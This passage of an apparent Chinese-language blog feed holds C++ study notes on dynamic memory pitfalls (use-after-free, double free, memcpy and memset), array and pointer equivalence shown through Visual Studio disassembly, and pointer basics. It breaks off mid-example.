class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">10</span>);</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p[<span class="number">2</span>] = <span class="number">99</span>;<span class="comment">//编译器不一定会报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当内存空间free掉之后，指针指向的内存生命周期到了，没有了。下次程序使用的时候就有可能产生不可预料的错误。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line"><span class="keyword">delete</span>[]p;</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">300</span>;<span class="comment">//这段程序就会报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/07/dynamicsmemory/011.png" class=""><p>会报错是好事，能及时止损。</p><p>还有一种情况就是你的指针备份过了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p2 = p;</span><br><span class="line">p[<span class="number">0</span>] = <span class="number">250</span>;</span><br><span class="line"><span class="keyword">delete</span>[]p;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">300</span>;<span class="comment">//编译通过了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这玩意也挺狠，利用备份的指针重写，都不知道写到哪去了。</p><hr><h3 id="重复释放"><a href="#重复释放" class="headerlink" title="重复释放"></a>重复释放</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure><p>编译器会给出警告，虽然你释放过了这片区域，但是难免不保证被被人申请到，当别人申请到了之后，你又再来一下释放。。。这不是一种耍流氓行为吗，所以不可取。</p><hr><h3 id="内存碎片"><a href="#内存碎片" class="headerlink" title="内存碎片"></a>内存碎片</h3><p>当程序频繁申请和释放内存，就会导致产生内存碎片</p><img src="/2022/05/07/dynamicsmemory/012.png" class=""><p>虽然释放掉的内存没有被占用，但是无法规避我们后面需要多大的空间。那么这些零散的内存就被称为内存碎片。<br>当然new和delete会尽量规避风险，有能力自己额外注意。</p><hr><h3 id="混用"><a href="#混用" class="headerlink" title="混用"></a>混用</h3><p>malloc申请的内存用delete释放<br>new分配的内存用free释放</p><blockquote><p>底层new就是通过malloc实现的，那么delete也八九不离十是free为原型的<br>但是，new毕竟是c++的产物，所以不建议混用，以免养成不好习惯或不必要的麻烦。</p></blockquote><hr><h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><p>如果想要将数组复制到new出来的内存上时，最常用就是通过循环赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">p[i] = ch[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么c++也有定义好的函数<br><code>void * memcpy(void* _Dst, const void *_Src, size_t_size);</code><br>也就是将src的内存数据复制到dst上，关键是还要指定长度size</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(p, ch, <span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果不想全复制，那也就是对长度做手脚，修改一下就行。往小了还行，往大了赋值只会越界，后面的内存不归你使用，所以不要傻乎乎玩这么大</strong></p><hr><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p>在经过memcpy之后，如果只复制几个，后面的元素又没有初始化过。就是一堆乱值。<br>memset就是将指定内存区域按每个字节的值都设置起来<br><code>void *memset(void *_Dst,int val,size_t_size);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line"><span class="built_in">memset</span>(p,<span class="number">0</span>,<span class="built_in">sizeof</span>(<span class="type">int</span>)*<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>for循环打印查看结果：<img src="/2022/05/07/dynamicsmemory/013.png" class=""></p><p>然后就是坏事，因为memset是按照每个字节分配内存。一个字节的范围0-255，十六进制也就0xff。<br>如果val超过了255，可以看看会发生什么。</p><p>val &#x3D; 0xff的情况下：<img src="/2022/05/07/dynamicsmemory/014.png" class=""><br>十进制可能不够明显，我们转换成十六进制输出<code>std::cout &lt;&lt; std::hex &lt;&lt; p[i] &lt;&lt; std::endl;</code></p><img src="/2022/05/07/dynamicsmemory/015.png" class=""> 两个十六进制数一个字节<p>val &#x3D; 0x123456时：<img src="/2022/05/07/dynamicsmemory/016.png" class=""></p><p><strong>所以建议初始化的时候，val设置为0或者0x00，就不要整别的了</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>那么动态内存分配就到此先，凡是需要人去手动构造的都需要格外谨慎。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointerArray</title>
      <link href="/2022/05/05/pointerArray/"/>
      <url>/2022/05/05/pointerArray/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>分析一下编译器vs2022对数组的访问操作。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先参照一下视频的分析</p><img src="/2022/05/05/pointerArray/001.png" class=""><p>汇编这玩意，看着看着倒是顺眼了，前提是简单的操作。</p><ol><li>mov eax,4 就是类似于eax&#x3D;4</li><li>imul ecx,eax,0 是 eax*0之后赋值给ecx，不过都乘以0了，ecx也就是0了</li><li>lea edx,[ebp+ecx-1Ch] ecx是0在上一步有说明了，就剩ebp-1Ch的地址传递给edx</li><li>mov dword ptr [ebp-28h],edx 这一步就是将[ebp-28h]的这段空间写入edx，也就是[ebp-1Ch]</li><li>mov eax,dword ptr [ebp-28h] ,这里[ebp-28h]已经写入了之前说的edx的值[ebp-1Ch],相当于eax&#x3D;edx了</li><li>mov dword ptr [eax],5 ，因为之前也说了eax&#x3D;edx，所以这里给eax&#x3D;5，就是变相的给edx&#x3D;5<br>然后回头看，能说什么说明？说明edx的那段内存地址是属于a[0]的，而[ebp-28h]的那段空间就是指针占用的部分，换种写法就是[ebp-28h] &#x3D; [ebp-1Ch] &#x2F; 也就是int *ptrA &#x3D; &amp;a[0];</li></ol><p>不信话看<code>a[0] = 5</code>这段反汇编</p><ol><li>mov eax，4 也就是eax&#x3D;4</li><li>imul ecx,eax,0 也就是ecx &#x3D; exa * 0；</li><li>mov dword ptr [ebp+ecx-1Ch],5 这一步将5传递到[ebp+ecx-1Ch]上，ecx&#x3D;0了，也就是[ebp-1Ch] &#x3D; 5,那么你会发现，在上述分析的时候，int *p &#x3D; &amp;ch[0]，也出现了[ebp-1Ch]，可想而知，[ebp-1Ch] 他就是a[0]占用的地址。</li></ol><p>在看<code>a[1] = 5</code></p><ol><li>mov eax,4</li><li>shl eax,0    ,shl是左位移操作，相当于eax &lt;&lt; 0, 那么向左位移的时候说过，相当于eax * 2^n，这里n&#x3D;0，所以eax * 2^0 ,也就是eax*1，4*1，这里eax还是&#x3D;4；&#x2F;&#x2F;正常情况下左位移一位相当于原数乘以二</li><li>mov dword ptr [ebp+eax-1Ch],5 这里有意思了，虽然看似差不多，但是这个时候eax的值已经是4了，所以ch[1]的地址就是[ebp+4-1Ch]。同理这句话就是[ebp+4-1Ch] &#x3D; 5;</li></ol><p>最后<code>a[2] = 5</code></p><ol><li>mov eax,4 ,eax&#x3D;4</li><li>shl eax,1    ，eax &lt;&lt; 1, eax * 2^1，也就是eax &#x3D; 8</li><li>mov dword ptr [ebp+eax-1Ch] , 也就是[ebp+8-1Ch] &#x3D; 5; 那么a[2]的地址也就是[ebp+8-1Ch]</li></ol><p>往后推a[3]的地址也就是[ebp+12-1Ch],a[4] &#x3D; [ebp+16-1Ch]。<br>所以说数组的地址，都是基于首地址进行一个偏移量，这个偏移量根据类型得出，首地址也就是a[0]<br>看a[1]的时候，[1]就是代表了要进行的偏移量，1*4，那么怎么获取首地址呢，就要靠前面那个a，所以能得出a &#x3D;&#x3D; &amp;a[0]的结论。<br>实际测试效果一致</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;a[<span class="number">0</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/002.png" class=""><p>看到地址确实是一样的。那么论证a &#x3D;&#x3D; &amp;a[0]是成立的。也就是说当指针指向一个数组首地址的时候，可以直接<code>int *p = a</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> *p&#123; &amp;ch[<span class="number">0</span>] &#125;;</span><br><span class="line"></span><br><span class="line">*p = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">ch[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">ch[<span class="number">1</span>] = <span class="number">50</span>;</span><br><span class="line">ch[<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; ch[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现他俩得值都是一样的：</p><img src="/2022/05/05/pointerArray/003.png" class=""><p>那么反推过来，因为看过了反汇编，发现数组其实就是指针偏移过来的产物。<br>除了特定情况下：比如sizeof的时候，a代表的才是一整个数组，这点我们在学习求数组长度的时候就知道，sizeof(ch)&#x2F;sizeof(ch[0]);但是我们sizeof(p)他只能是4，64位是8。因为本质上指针就是指针，数组是经过包装的。</p><hr><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>多维数组声明的时候就看有几个[]，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> ch[<span class="number">2</span>][<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>][<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>但是，数组是一片连续的空间，那么多维，就只是人用逻辑结构抽象出来的产物。为什么这么说呢，往下看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//ch[0] ch[1] ch[2] ch[3] 。。。。</span></span><br><span class="line"><span class="type">int</span> ch[<span class="number">2</span>][<span class="number">5</span>]</span><br><span class="line"><span class="comment">//ch[0][0] ch[0][1] ch[0][2]。。。</span></span><br><span class="line"><span class="comment">//ch[1][0] ch[1][1] ch[1][2]。。。</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>][<span class="number">2</span>]</span><br><span class="line"><span class="comment">//ch[0][0] ch[0][1]</span></span><br><span class="line"><span class="comment">//ch[1][0] ch[1][1]</span></span><br><span class="line"><span class="comment">//ch[2][0] ch[2][1]</span></span><br><span class="line"><span class="comment">//.......</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2*5&#x3D;10,5*2&#x3D;10,那么物理上，一维和多维可以说是没有什么区别，就是抽象多了一层结构，方便人去阅读和理解。<br>为了更好理解，继续用代码测试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ch[<span class="number">2</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;,</span><br><span class="line">&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/004.png" class=""><p>会看到提示类型转换有问题，那么老样子强转一波：<code>int *p = (int *)ch;</code></p><img src="/2022/05/05/pointerArray/005.png" class=""> 没问题，那就继续操作。<p>正常情况下访问ch的第九个元素要通过ch[1][3]获取。那我们是否能用p[8]直接访问。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; ch[<span class="number">1</span>][<span class="number">3</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p[<span class="number">8</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/006.png" class=""><p>发现能正常输出啊，这就恰好论证了我们之前说的在底层中，多维实际上跟一维没有差别。</p><p>但是不是说多维就没用，不然这种逻辑结构就没有存在的意义了，这里只是探究本质。多维在很多地方还是很有用的，几行几列是人最习惯的东西。</p><p>想要指针实现多维的效果也是可以的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p2[<span class="number">5</span>] = ch;    <span class="comment">//不合法，因为这种写法是声明了五个int类型的指针，通常称为指针数组</span></span><br><span class="line"><span class="built_in">int</span>(*p3)[<span class="number">5</span>] = ch;   <span class="comment">//这种写法被称为数组指针，是可以=二维数组的</span></span><br></pre></td></tr></table></figure><img src="/2022/05/05/pointerArray/007.png" class=""><p>发现结果都一样，说明逻辑结构存在了。</p><p>然后我们再看看它们的大小：<img src="/2022/05/05/pointerArray/008.png" class=""><br>发现指针数组的区别在于他是变量类型*[]的数字，而数组指针仍然是一个指针的大小。</p><p>再看看指针数组+1和数组指针+1的区别：<br>数组指针+1的时候：<img src="/2022/05/05/pointerArray/009.png" class=""><br>它们之间相差20，这个20怎么来的，就是变量类型乘以[]的数字得来的，数组指针这种写法会造成特殊的逻辑，*p2看作行，[5]看作列，那么p2每加一个1，他的步长就变成了5。所以不是我们之前说的指针正常+1，就是偏移一个他的变量类型。<br>指针数组我们说了定义就是几个int类型的指针，它每次加一，步长就为变量类型的大小。</p><blockquote><p>这也是一个误区，容易弄混淆的地方，所以要特别注意数组指针和指针数组的使用方式。</p></blockquote><p>然后就是之前说过的一维数组的时候，ch[0]可以表示为数组的首地址，ch同样可以，因为参照的是ch[1~n]都要参照ch作为首地址进行偏移，那么二维数组呢？或者说多维数组，是不是也有相同的操作。</p><p>可以尝试一下,直接打印各自的首地址：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; *p3[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; ch[<span class="number">0</span>][<span class="number">0</span>] &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>发现结果是一样的：<img src="/2022/05/05/pointerArray/010.png" class=""><br>二者的地址也是一样的：<img src="/2022/05/05/pointerArray/012.png" class=""><br>甚至说俩都+1，往后偏移一位，结果也是一样的：<img src="/2022/05/05/pointerArray/011.png" class=""></p><p>所以ch[0][0] 也是要参照前面的ch[0]来偏移获取，故此ch[0] &#x3D;&#x3D; ch[0][0]也得到了论证。</p><hr><h1 id="试试看自己机子反汇编后的"><a href="#试试看自己机子反汇编后的" class="headerlink" title="试试看自己机子反汇编后的"></a>试试看自己机子反汇编后的</h1><p>然后自己先随便写一段：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> *p = &amp;ch[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">*p = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">ch[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">ch[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">ch[<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后老样子随便在一句代码上打个断点进行反汇编：</p><img src="/2022/05/05/pointerArray/000.png" class=""><p>不知道是不是编译器的问题，视频用的2019，我用的2022。x86都是x86，但是在每个mov上操作的不太一样。<br>像视频教学的时候最后赋值是mov dword ptr [ebp+eax-1Ch],5。通过这样的写法能直观的看出规律。和计算出位置。</p><p>而我自己这个2022反汇编出来的，最后赋值的时候却是mov dword ptr ch[eax],5。就感觉有点突兀了。<br>摘自<code>ch[1]=5</code></p><ol><li>eax,4    &#x2F;&#x2F;eax &#x3D; 4 没啥问题</li><li>shl eax,0    &#x2F;&#x2F;eax &lt;&lt; 0, eax &#x3D; 4</li><li>mov dword ptr ch[eax],5  &#x2F;&#x2F;但是这个ch[4] &#x3D; 5就不太现实啊</li></ol><p>怎么说这里eax也应该是1才对，除非你说要除以变量类型，或者说先计算出指针ch的地址在+上eax作为偏移量，这样换算也行。</p><p><strong>后面听群友说要关闭显示符号名</strong></p><img src="/2022/05/05/pointerArray/013.png" class=""><p>看到雀食变成ebp的形式了</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看起来觉得没啥东西，学起来又绕来绕去，学完了或多或少没记全。。。多用用或许还能避避坑，反正用到了再回头看看。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointer</title>
      <link href="/2022/05/02/pointer/"/>
      <url>/2022/05/02/pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="c-x2F-c-的万恶之源"><a href="#c-x2F-c-的万恶之源" class="headerlink" title="c&#x2F;c++的万恶之源"></a>c&#x2F;c++的万恶之源</h1><ul><li>指针</li></ul><span id="more"></span><hr><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>指针，是C语言中的一个重要概念及其特点，也是掌握C语言比较困难的部分。指针也就是内存地址，指针变量是用来存放内存地址的变量，在同一CPU构架下，不同类型的指针变量所占用的存储单元长度是相同的，而存放数据的变量因数据的类型不同，所占用的存储空间长度也不同。有了指针以后，不仅可以对数据本身，也可以对存储数据的变量地址进行操作。<br>——摘自百度</p><p>因为运行一个程序，需要消耗内存，程序当中的变量各自有占用的地方，通常以十六进制表示，用visual studio反汇编的时候就能看到前面有一串长的字符。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>不同类型的变量所占用的内存也各不相同，有基础的应该都知道，目前先不说32位操作系统的情况，以64位操作系统为例。</p><blockquote><p>tips:int 类型占用 4字节 &#x3D; 32比特，一个比特可以表示0或者1</p></blockquote><p>指针的要素就是要操作对象的内存地址和大小</p><hr><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据类型* 变量名称；例如：</span></span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line"><span class="comment">//int* p; 都可以，*在前或在后都是表示指针，取决于使用者的习惯。</span></span><br></pre></td></tr></table></figure><hr><h2 id="初试指针"><a href="#初试指针" class="headerlink" title="初试指针"></a>初试指针</h2><p>打开编译器，运行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p&#123;&#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vs2019开始变量不初始化会报错，所以我们这里采用int *p{};</p></blockquote><p>可以看到：<img src="/2022/05/02/pointer/000.png" class=""><br>可以看到打印的是多个0，那么接下来可以看看一个其他变量的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line">    <span class="comment">//直接int *p = &amp;a也无妨</span></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到结果是一个十六进制的数：<img src="/2022/05/02/pointer/001.png" class=""></p><blockquote><p>为什么要用&amp;呢，在学习C语言scanf语句的时候，我们知道了往一个变量写入值的时候需要知道变量的地址。此处概念相同。<br>其次，指针的类型必须和获取地址的变量类型一致。</p></blockquote><p>有意思的是，这个地址，每次生成程序都会发生改变，</p><img src="/2022/05/02/pointer/002.png" class=""><p>其原因就是因为这个变量是个局部变量，将其提升为全局变量则内存地址固定。</p><p>那么明白了不带*的时候输出就是地址，就可以猜到带*输出时表示为a的值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/02/pointer/003.png" class=""><p>有聪明的小伙伴就会想到，*p代表值，那么<code>\*p=200</code>是不是就可以修改a的值呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line">*p = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>ok，结果当然是：<img src="/2022/05/02/pointer/004.png" class=""></p><blockquote><p>tips: 这里也可以不用*p &#x3D; 200, 将a &#x3D; 200；效果也一样</p></blockquote><p>同理，不带*的时候，可以给指针换个地址。但注意<em>不要是非地址以外的东西，并且这个地址是有意义的，避免产生不可预期的后果</em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">p = &amp;b; <span class="comment">//修改指针p的地址为变量b的地址。</span></span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span 